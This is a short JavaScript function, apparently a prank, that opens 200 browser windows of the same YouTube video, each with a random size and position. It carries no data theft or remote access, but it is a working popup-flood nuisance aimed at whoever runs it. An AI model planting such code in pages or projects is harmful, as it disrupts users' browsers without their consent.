function abre() {
    let c = 1000;

    for (i = 0; i < 200; i++) {
        window.open("https://www.youtube.com/watch?v=Da-CIlJU8I4&pp=ygUeaGFibGFtb3MgbWHDsWFuYWJhZCBidW5ueSBkdWtp",
            "ventana" + [i],

            "width=" + Math.random() * (c) +
            " height=" + Math.random() * (c) +
            " top=" + Math.random() * (c) +
            " left=" + Math.random() * (c)
        );
    }
}